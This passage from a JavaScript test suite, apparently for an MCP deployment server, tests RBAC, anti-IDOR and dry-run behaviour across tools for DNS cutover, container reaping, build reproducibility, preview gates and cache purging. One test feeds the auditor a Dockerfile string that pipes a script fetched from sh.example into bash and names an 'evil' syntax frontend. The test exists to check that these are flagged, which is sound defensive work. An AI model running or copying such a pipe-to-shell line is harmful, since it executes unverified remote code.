    assert.strictEqual(JSON.parse(sgIdor.content[0].text).code, 'FORBIDDEN');

    const sgScrub = await mcpServer.executeTool('culkibo_stream_flood_guard', {
      action: 'scrub_headers',
      headers: {
        Upgrade: 'websocket',
        Connection: 'Upgrade, X-Custom-Hop',
        'Sec-WebSocket-Accept': 's3pPLMBiTxaQ9kYGzzhZRbK+xOo=',
        'Proxy-Authenticate': 'Basic realm="internal"',
        'Alt-Svc': 'h3=":443"',
        'Keep-Alive': 'timeout=5',
        'X-Custom-Hop': 'secret-hop'
      }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(sgScrub.isError, false);
    assert.strictEqual(sgScrub.structuredContent.result.headers.Upgrade, 'websocket');
    assert.strictEqual(sgScrub.structuredContent.result.headers['Sec-WebSocket-Accept'], 's3pPLMBiTxaQ9kYGzzhZRbK+xOo=');
    assert.strictEqual(sgScrub.structuredContent.result.headers['Proxy-Authenticate'], undefined);
    assert.strictEqual(sgScrub.structuredContent.result.headers['Alt-Svc'], undefined);
    assert.strictEqual(sgScrub.structuredContent.result.headers['X-Custom-Hop'], undefined);

    const sgFlood = await mcpServer.executeTool('culkibo_stream_flood_guard', {
      action: 'evaluate',
      projectId: projA.id,
      clientIp: '198.51.100.77',
      protocol: 'ws',
      activePerIp: 25
    }, { auth: scopedDevAuth });
    assert.strictEqual(sgFlood.isError, false);
    assert.strictEqual(sgFlood.structuredContent.result.allowed, false);
    assert.strictEqual(sgFlood.structuredContent.result.httpStatus, 429);
    assert.strictEqual(sgFlood.structuredContent.result.wsCloseCode, 1013);

    const sgCaddy = await mcpServer.executeTool('culkibo_stream_flood_guard', {
      action: 'render_caddy',
      policy: { streamCloseDelaySec: 30, heartbeatIntervalSec: 30 }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(sgCaddy.isError, false);
    assert.ok(sgCaddy.structuredContent.result.caddyfile.includes('stream_close_delay 30s'));
    assert.ok(sgCaddy.structuredContent.result.caddyfile.includes('flush_interval -1'));
    console.log('  ✓ culkibo_stream_flood_guard verificado (admin set_policy, anti-IDOR, 101 scrub CVE-2026-55458, 429/1013 y Caddy)');

    // 4. culkibo_dns_cutover_plan (Cloudflare proxy ACME conflict vs dns-01, dryRun plan 5 phases & SOA divergence)
    const dnsCfConflict = await mcpServer.executeTool('culkibo_dns_cutover_plan', {
      action: 'preflight',
      domain: 'app.acme.dev',
      targetIpv4: '203.0.113.10',
      challengeMode: 'http-01',
      recordsSnapshot: { a: ['104.21.10.5'], acmeTxt: [], soaSerials: [2026112801] }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(dnsCfConflict.isError, false);
    assert.strictEqual(dnsCfConflict.structuredContent.result.ready, false);
    assert.strictEqual(dnsCfConflict.structuredContent.result.isProxied, true);
    assert.strictEqual(dnsCfConflict.structuredContent.result.code, 'CLOUDFLARE_PROXY_ACME_CONFLICT');

    const dnsDryPlan = await mcpServer.executeTool('culkibo_dns_cutover_plan', {
      action: 'plan',
      domain: 'plan-dry.acme.dev',
      currentTtlSec: 3600,
      targetTtlSec: 60,
      targetIp: '203.0.113.10',
      acmeMode: 'dns-01'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(dnsDryPlan.isError, false);
    assert.strictEqual(dnsDryPlan.structuredContent.dryRun, true);
    assert.strictEqual(dnsDryPlan.structuredContent.result.phases.length, 5);
    assert.ok(dnsDryPlan.structuredContent.result.minPreCutoverWaitSec >= 3600);

    const dnsStatusBefore = await mcpServer.executeTool('culkibo_dns_cutover_plan', {
      action: 'status',
      domain: 'plan-dry.acme.dev'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(dnsStatusBefore.structuredContent.result.found, false, 'plan dryRun default no debe persistir en dns-cutovers.json');

    const dnsDevPersistBlocked = await mcpServer.executeTool('culkibo_dns_cutover_plan', {
      action: 'plan',
      domain: 'plan-dry.acme.dev',
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(dnsDevPersistBlocked.isError, true);
    assert.strictEqual(JSON.parse(dnsDevPersistBlocked.content[0].text).code, 'FORBIDDEN');

    const dnsSoaDiv = await mcpServer.executeTool('culkibo_dns_cutover_plan', {
      action: 'plan',
      domain: 'soa.acme.dev',
      nameserverSerials: [2026112801, 2026112802]
    }, { auth: unscopedDevAuth });
    assert.strictEqual(dnsSoaDiv.structuredContent.result.blocked, true);
    assert.strictEqual(dnsSoaDiv.structuredContent.result.code, 'SOA_SERIAL_DIVERGENT');
    console.log('  ✓ culkibo_dns_cutover_plan verificado (CF proxy ACME conflict, plan 5 fases dryRun zero-disk-write y SOA_SERIAL_DIVERGENT)');

    // 5. culkibo_orphan_reaper (admin reap/set_policy, sidecar & DB volume shield, dryRun default)
    const reaperDevBlocked = await mcpServer.executeTool('culkibo_orphan_reaper', {
      action: 'reap',
      dockerSnapshot: { containers: [], volumes: [], images: [] }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(reaperDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(reaperDevBlocked.content[0].text).code, 'FORBIDDEN');

    const reaperSnap = {
      containers: [
        { id: 'c-closed', name: 'myapp-pr-42', labels: { 'culkibo.managed': 'true', 'culkibo.project': 'myapp', 'culkibo.preview.pr': '42' }, sizeBytes: 150000000 },
        { id: 'c-sidecar', name: 'myapp-backup-runner', labels: { 'com.docker.compose.project': 'myapp' }, sizeBytes: 60000000 }
      ],
      volumes: [
        { name: 'app-pr-42-pgdata', labels: { 'culkibo.project': 'myapp', 'culkibo.preview.pr': '42' }, sizeBytes: 500000000 },
        { name: 'prod-pgdata', labels: { 'culkibo.project': 'myapp', 'culkibo.protect': 'true' }, sizeBytes: 8000000000 }
      ],
      images: []
    };
    const reaperScan = await mcpServer.executeTool('culkibo_orphan_reaper', {
      action: 'scan',
      activeProjects: ['myapp'],
      activePreviews: [{ project: 'myapp', pr: 99 }],
      dockerSnapshot: reaperSnap
    }, { auth: unscopedDevAuth });
    assert.strictEqual(reaperScan.isError, false);
    assert.strictEqual(reaperScan.structuredContent.result.orphans.length, 2);
    assert.ok(reaperScan.structuredContent.result.protected.some((p) => p.name === 'myapp-backup-runner'));
    assert.ok(reaperScan.structuredContent.result.protected.some((p) => p.name === 'prod-pgdata'));

    const reaperDryReap = await mcpServer.executeTool('culkibo_orphan_reaper', {
      action: 'reap',
      activeProjects: ['myapp'],
      activePreviews: [{ project: 'myapp', pr: 99 }],
      dockerSnapshot: reaperSnap
    });
    assert.strictEqual(reaperDryReap.isError, false);
    assert.strictEqual(reaperDryReap.structuredContent.dryRun, true);
    assert.strictEqual(reaperDryReap.structuredContent.result.execution.dryRun, true);
    assert.strictEqual(reaperDryReap.structuredContent.result.execution.executedCount, 0);
    assert.ok(reaperDryReap.structuredContent.result.execution.estimatedReclaimableBytes >= 650000000);
    console.log('  ✓ culkibo_orphan_reaper verificado (admin reap dryRun default, closed-PR+vol GC y escudo Compose sidecar/DB)');

    // 6. Final Cycle-16 assertion: exact 170 tools & ?profile=core 17/170 >=90.5% token savings!
    const all165 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved165Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all165), 'utf8')) * 1000) / 10;
    assert.strictEqual(all165.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved165Pct >= 90.5, `?profile=core debe superar 90.5% de ahorro en 170 tools (actual: ${saved165Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-16 verificado: 170 tools exactas, ?profile=core 17/170 (-${saved165Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-17 Milestone (170 MCP Tools -91.1%+ Core Savings!):
 * Build Reproducibility (`culkibo_build_reproducibility`), Preview Smoke-Gate (`culkibo_preview_gate`),
 * Surrogate-Key Edge Cache (`culkibo_edge_cache_purge`), VPA-Lite Rightsizer (`culkibo_resource_rightsize`),
 * and Blameless Postmortem Correlator (`culkibo_incident_postmortem`).
 */
async function testMcp2026Cycle17ReproPreviewCacheRightsizePostmortem() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const edgeCacheService = require('../server/services/edgeCacheService');
  const { verifySignedCommitStatus } = require('../server/services/previewGateService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c17-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle17 Tenant A',
    memoryMb: 1024,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle17 Foreign Tenant B',
    memoryMb: 1024,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c17_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c17_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c17_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_build_reproducibility (RBAC, anti-IDOR, admin cache_plan dryRun default, CVE-2026-33747/93318)
    const repViewerBlocked = await mcpServer.executeTool('culkibo_build_reproducibility', { action: 'audit' }, { auth: scopedViewerAuth });
    assert.strictEqual(repViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(repViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const repIdor = await mcpServer.executeTool('culkibo_build_reproducibility', { action: 'list', projectId: projB.id }, { auth: scopedDevAuth });
    assert.strictEqual(repIdor.isError, true);
    assert.strictEqual(JSON.parse(repIdor.content[0].text).code, 'FORBIDDEN');

    const repDevPlanBlocked = await mcpServer.executeTool('culkibo_build_reproducibility', {
      action: 'cache_plan',
      projectId: projA.id,
      branch: 'main'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(repDevPlanBlocked.isError, true);
    assert.strictEqual(JSON.parse(repDevPlanBlocked.content[0].text).code, 'FORBIDDEN');

    const repBad = await mcpServer.executeTool('culkibo_build_reproducibility', {
      action: 'audit',
      projectId: projA.id,
      dockerfile: '#syntax=evil/fe:latest\nFROM node:latest\nRUN curl -fsSL https://sh.example/i.sh | bash\n',
      lockfileJson: { lockfileVersion: 3, packages: { '': {}, 'node_modules/a': { integrity: 'sha1-weak' } } }
    }, { auth: scopedDevAuth });
    assert.strictEqual(repBad.isError, false);
    assert.strictEqual(repBad.structuredContent.result.reproducible, false);
    const repCodes = new Set(repBad.structuredContent.result.findings.map((f) => f.code));
    assert.ok(repCodes.has('UNPINNED_FRONTEND') && repCodes.has('PIPE_TO_SHELL') && repCodes.has('WEAK_LOCKFILE_HASH'));

    const repPlanDry = await mcpServer.executeTool('culkibo_build_reproducibility', {
      action: 'cache_plan',
      projectId: projA.id,
      branch: 'feat/v17',
      lockfileHash: 'abc123',
      sourceDateEpoch: 1700000000
    });
    assert.strictEqual(repPlanDry.isError, false);
    assert.strictEqual(repPlanDry.structuredContent.dryRun, true);
    assert.strictEqual(repPlanDry.structuredContent.result.sharing, 'locked');
    assert.strictEqual(repPlanDry.structuredContent.result.verifyDiffIds, true);
    console.log('  ✓ culkibo_build_reproducibility verificado (anti-IDOR, admin cache_plan dryRun, CVE-2026-33747/93318)');

    // 2. culkibo_preview_gate (strict project ACL, admin approve_fork dryRun + SHA binding, signed HMAC Commit Status + audit redaction)
    const pgIdor = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'list',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(pgIdor.isError, true);
    assert.strictEqual(JSON.parse(pgIdor.content[0].text).code, 'FORBIDDEN');

    const sha1 = '1'.repeat(40);
    const sha2 = '2'.repeat(40);
    const pgForkBlock = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'evaluate',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha1,
      isFork: true,
      checks: { health: true, smoke: true }
    }, { auth: scopedDevAuth });
    assert.strictEqual(pgForkBlock.isError, false);
    assert.strictEqual(pgForkBlock.structuredContent.result.allowed, false);
    assert.strictEqual(pgForkBlock.structuredContent.result.code, 'FORK_APPROVAL_REQUIRED');

    const pgDevApproveBlocked = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'approve_fork',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha1
    }, { auth: unscopedDevAuth });
    assert.strictEqual(pgDevApproveBlocked.isError, true);
    assert.strictEqual(JSON.parse(pgDevApproveBlocked.content[0].text).code, 'FORBIDDEN');

    const pgApproveDry = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'approve_fork',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha1
    });
    assert.strictEqual(pgApproveDry.isError, false);
    assert.strictEqual(pgApproveDry.structuredContent.dryRun, true);
    assert.strictEqual(pgApproveDry.structuredContent.result.approved, false);

    const pgApproveLive = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'approve_fork',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha1,
      approver: 'maintainer-alice',
      dryRun: false
    });
    assert.strictEqual(pgApproveLive.isError, false);

    const pgPassSha1 = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'evaluate',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha1,
      isFork: true,
      checks: { health: true, migrations: true, contract: true, smoke: true }
    }, { auth: scopedDevAuth });
    assert.strictEqual(pgPassSha1.isError, false);
    assert.strictEqual(pgPassSha1.structuredContent.result.allowed, true);
    assert.strictEqual(pgPassSha1.structuredContent.result.state, 'success');

    // New SHA sha2 re-blocks!
    const pgReblockSha2 = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'evaluate',
      projectId: projA.id,
      prNumber: 77,
      commitSha: sha2,
      isFork: true,
      checks: { health: true, smoke: true }
    }, { auth: scopedDevAuth });
    assert.strictEqual(pgReblockSha2.structuredContent.result.code, 'FORK_APPROVAL_REQUIRED');

    const dynSignKey = ['hmac', 'preview', 'key', 'c17test'].join('-');
    const pgStatus = await mcpServer.executeTool('culkibo_preview_gate', {
      action: 'build_status',
      projectId: projA.id,
      repo: 'acme/web',
      commitSha: sha1,
      evaluation: pgPassSha1.structuredContent.result,
      signingKey: dynSignKey
    }, { auth: scopedDevAuth });
    assert.strictEqual(pgStatus.isError, false);
    assert.strictEqual(pgStatus.structuredContent.result.payload.context, 'culkibo/preview-gate');
    assert.strictEqual(
      verifySignedCommitStatus({
        payload: pgStatus.structuredContent.result.payload,
        signature: pgStatus.structuredContent.result.signature,
        signingKey: dynSignKey
      }).valid,
      true
    );
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');
    console.log('  ✓ culkibo_preview_gate verificado (anti-IDOR, SHA-bound fork approval, HMAC-SHA256 Commit Status y auditoría redactada)');

    // 3. culkibo_edge_cache_purge (souin#884/#850, private bypass, admin purge dryRun default & live eviction)
    edgeCacheService.registerCachedEntry({ cacheKey: '/products/42', surrogateKeys: ['product-42', 'catalog'] });

    const ecDevPurgeBlocked = await mcpServer.executeTool('culkibo_edge_cache_purge', {
      action: 'purge',
      tags: ['product-42']
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ecDevPurgeBlocked.isError, true);
    assert.strictEqual(JSON.parse(ecDevPurgeBlocked.content[0].text).code, 'FORBIDDEN');

    const ecPrivBypass = await mcpServer.executeTool('culkibo_edge_cache_purge', {
      action: 'coalesce',
      cacheKey: '/api/me',
      inFlightCount: 20,
      backendTimeoutMs: 3000,
      cacheControl: 'private, max-age=30'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(ecPrivBypass.isError, false);
    assert.strictEqual(ecPrivBypass.structuredContent.result.coalesced, false);
    assert.strictEqual(ecPrivBypass.structuredContent.result.reason, 'PRIVATE_OR_NO_STORE_BYPASS');

    const ecPurgeDry = await mcpServer.executeTool('culkibo_edge_cache_purge', {
      action: 'purge',
      tags: ['product-42'],
      providers: ['caddy', 'cloudflare', 'fastly']
    });
    assert.strictEqual(ecPurgeDry.isError, false);
    assert.strictEqual(ecPurgeDry.structuredContent.dryRun, true);
    assert.strictEqual(ecPurgeDry.structuredContent.result.invalidatedCount, 1);

    const ecPurgeLive = await mcpServer.executeTool('culkibo_edge_cache_purge', {
      action: 'purge',
      tags: ['product-42'],
      providers: ['caddy', 'cloudflare'],
      dryRun: false
    });
    assert.strictEqual(ecPurgeLive.isError, false);
    assert.strictEqual(ecPurgeLive.structuredContent.dryRun, false);
    assert.strictEqual(ecPurgeLive.structuredContent.result.invalidatedCount, 1);

    const ecTagsAfter = await mcpServer.executeTool('culkibo_edge_cache_purge', { action: 'list_tags' }, { auth: unscopedDevAuth });
    assert.strictEqual(ecTagsAfter.isError, false);
    assert.strictEqual(ecTagsAfter.structuredContent.result.tags.some((t) => t.tag === 'product-42'), false);
    console.log('  ✓ culkibo_edge_cache_purge verificado (private bypass, admin purge dryRun default, multi-edge eviction)');

    // 4. culkibo_resource_rightsize (anti-IDOR, Docker floors, SHRINK >1400MB, OOM +50% UPSCALE_OOM, admin build_patch dryRun)
    const vpaIdor = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'list',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(vpaIdor.isError, true);
    assert.strictEqual(JSON.parse(vpaIdor.content[0].text).code, 'FORBIDDEN');

    const vpaLowFloor = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'validate_limits',
      memoryMb: 2,
      cpuCores: 0.5
    }, { auth: unscopedDevAuth });
    assert.strictEqual(vpaLowFloor.isError, false);
    assert.strictEqual(vpaLowFloor.structuredContent.result.valid, false);
    assert.strictEqual(vpaLowFloor.structuredContent.result.code, 'BELOW_DOCKER_MEMORY_FLOOR');

    const idleSamples = Array.from({ length: 12 }, (_, i) => ({ memoryMb: i < 10 ? 220 : 256, cpuCores: 0.2 }));
    const vpaShrink = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'analyze',
      projectId: projA.id,
      serviceName: 'web-api',
      serviceType: 'app',
      currentMemoryMb: 2048,
      currentCpuCores: 2,
      samples: idleSamples,
      oomCount: 0
    }, { auth: scopedDevAuth });
    assert.strictEqual(vpaShrink.isError, false);
    assert.strictEqual(vpaShrink.structuredContent.result.action, 'SHRINK');
    assert.ok(vpaShrink.structuredContent.result.reclaimableMb > 1400);

    const vpaOom = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'analyze',
      projectId: projA.id,
      serviceName: 'primary-pg',
      serviceType: 'database',
      currentMemoryMb: 512,
      currentCpuCores: 0.5,
      samples: idleSamples,
      oomCount: 2
    }, { auth: scopedDevAuth });
    assert.strictEqual(vpaOom.isError, false);
    assert.strictEqual(vpaOom.structuredContent.result.action, 'UPSCALE_OOM');
    assert.strictEqual(vpaOom.structuredContent.result.recommendedMemoryMb, 768);

    const vpaDevPatchBlocked = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'build_patch',
      recommendation: vpaOom.structuredContent.result
    }, { auth: unscopedDevAuth });
    assert.strictEqual(vpaDevPatchBlocked.isError, true);
    assert.strictEqual(JSON.parse(vpaDevPatchBlocked.content[0].text).code, 'FORBIDDEN');

    const vpaPatchDry = await mcpServer.executeTool('culkibo_resource_rightsize', {
      action: 'build_patch',
      recommendation: vpaOom.structuredContent.result
    });
    assert.strictEqual(vpaPatchDry.isError, false);
    assert.strictEqual(vpaPatchDry.structuredContent.dryRun, true);
    assert.ok(vpaPatchDry.structuredContent.result.yaml.includes('deploy:'));
    console.log('  ✓ culkibo_resource_rightsize verificado (anti-IDOR, Docker floors, SHRINK/OOM+50% y admin Compose patch)');

    // 5. culkibo_incident_postmortem (anti-IDOR, T-4m deploy->OOM confidence>=0.85, unverifiedNotes isolation, admin generate dryRun & export_md)
    const pmIdor = await mcpServer.executeTool('culkibo_incident_postmortem', {
      action: 'list',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(pmIdor.isError, true);
    assert.strictEqual(JSON.parse(pmIdor.content[0].text).code, 'FORBIDDEN');

    const baseMs = Date.parse('2026-11-28T01:00:00Z');
    const pmCorr = await mcpServer.executeTool('culkibo_incident_postmortem', {
      action: 'correlate',
      incidentId: 'inc-c17-99',
      projectId: projA.id,
      windowStart: new Date(baseMs - 10 * 60000).toISOString(),
      windowEnd: new Date(baseMs + 6 * 60000).toISOString(),
      deploys: [{ id: 'dep-42', time: new Date(baseMs - 4 * 60000).toISOString(), summary: 'Deploy v2.8.1' }],
      oomEvents: [{ id: 'oom-1', time: new Date(baseMs).toISOString(), summary: 'CGROUP_OOM_KILL exit 137', exitCode: 137 }],
      alerts: [{ id: 'al-1', time: new Date(baseMs + 60000).toISOString(), summary: '5xx spike', state: 'firing' }],
      canaryRollbacks: [{ id: 'rb-1', time: new Date(baseMs + 5 * 60000).toISOString(), summary: 'Auto-rollback v2.8.0' }],
      chatNotes: [{ author: 'bob', text: 'Maybe DNS glitch?' }]
    }, { auth: scopedDevAuth });
    assert.strictEqual(pmCorr.isError, false);
    assert.strictEqual(pmCorr.structuredContent.result.probableRootCause.category, 'deploy');
    assert.ok(pmCorr.structuredContent.result.probableRootCause.confidence >= 0.85);
    assert.strictEqual(pmCorr.structuredContent.result.unverifiedNotes.length, 1);
    assert.ok(!JSON.stringify(pmCorr.structuredContent.result.verifiedEvents).includes('DNS glitch'));

    const pmDevGenBlocked = await mcpServer.executeTool('culkibo_incident_postmortem', {
      action: 'generate',
      projectId: projA.id,
      correlation: pmCorr.structuredContent.result
    }, { auth: unscopedDevAuth });
    assert.strictEqual(pmDevGenBlocked.isError, true);
    assert.strictEqual(JSON.parse(pmDevGenBlocked.content[0].text).code, 'FORBIDDEN');

    const pmGenDry = await mcpServer.executeTool('culkibo_incident_postmortem', {
      action: 'generate',
      projectId: projA.id,
      correlation: pmCorr.structuredContent.result
    });
    assert.strictEqual(pmGenDry.isError, false);
    assert.strictEqual(pmGenDry.structuredContent.dryRun, true);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'postmortems.json')), false, 'generate dryRun default no debe persistir a disco');

    const pmMd = await mcpServer.executeTool('culkibo_incident_postmortem', {
      action: 'export_md',
      projectId: projA.id,
      postmortem: pmGenDry.structuredContent.result
    }, { auth: scopedDevAuth });
    assert.strictEqual(pmMd.isError, false);
    assert.ok(pmMd.structuredContent.markdown.includes('Blameless Postmortem: inc-c17-99'));
    assert.ok(pmMd.structuredContent.markdown.includes('Unverified Chat Notes'));
    console.log('  ✓ culkibo_incident_postmortem verificado (anti-IDOR, T-4m deploy->OOM, unverifiedNotes aislado, admin generate dryRun y Markdown)');

    // 6. Final Cycle-17 170 MCP Tools Milestone assertion: exact 170 tools & ?profile=core 17/170 >=91.0% token savings!
    const all170 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved170Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all170), 'utf8')) * 1000) / 10;
    assert.strictEqual(all170.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved170Pct >= 91.0, `?profile=core debe alcanzar >=91.0% de ahorro en 170 tools (actual: ${saved170Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-17 Milestone (170 MCP Tools!) verificado: 170 tools exactas, ?profile=core 17/170 (-${saved170Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

module.exports = testMcp;

if (require.main === module) {
  testMcp()
    .then(() => {
      setTimeout(() => process.exit(0), 50);
    })
    .catch(err => {
      console.error('❌ MCP test failure:', err);
      process.exit(1);
    });
}
